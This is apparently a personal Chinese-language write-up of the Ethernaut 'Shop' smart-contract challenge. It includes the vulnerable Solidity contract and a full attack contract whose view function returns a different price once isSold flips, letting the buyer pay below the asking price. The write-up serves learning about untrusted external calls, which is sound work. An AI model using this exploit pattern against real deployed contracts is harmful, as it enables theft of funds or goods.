# 21-Shop

日期: 23/08/2024
难易: 简单
漏洞小结: view的局限性
简单明了: 通过自身状态让view函数return不同的值

# 问题描述

Сan you get the item from the shop for less than the price asked?

### **Things that might help:**

- `Shop` expects to be used from a `Buyer`
- Understanding restrictions of view functions

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

# 攻击思路

- 写一个攻击合约去调用的话，攻击合约就会被cast成Buyer类型，那么就可以在攻击合约里面自定义price函数
- shop合约中，需要`price`函数在第一次调用的时候大于等于100，在第二次调用的时候小于100，两次调用之间isSold被设置成了true
- 虽然`price`函数修饰词是view，不能够修改参数，但是可以根据`isSold`来return不同的数值
    - 类似于修改参数了

# 攻击方式

```solidity
contract AttackShop{
    Shop public target;

    constructor(address _target){
        target = Shop(_target);
    }

    function attack() public{
        target.buy();
    }

    function price() public view returns (uint256){
        if(target.isSold()){
            return 99;
        }
        else {
            return 100;
        }
    }
}
```

# Ethernuat总结

Contracts can manipulate data seen by other contracts in any way they want.

It's unsafe to change the state based on external and untrusted contracts logic.

# 小白的思考

- Interface是可以自定义的，比较好利用
- View修饰词的函数不可以修改变量，但是可以通过其他变量的改变返回不同的值